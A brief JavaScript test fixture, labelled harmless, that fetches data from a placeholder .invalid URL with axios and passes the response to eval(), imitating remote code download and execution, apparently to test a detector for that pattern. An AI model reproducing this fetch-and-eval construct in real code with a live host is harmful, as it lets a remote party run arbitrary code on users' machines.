// HARMLESS TEST FIXTURE: imitates eval() on data fetched at runtime.
// The URL uses the reserved .invalid domain, so nothing can ever be downloaded.
const axios = require("axios");
async function loadConfig() {
  const res = await axios.get("https://config.example.invalid/settings");
  return eval(res.data);
}
module.exports = { loadConfig };
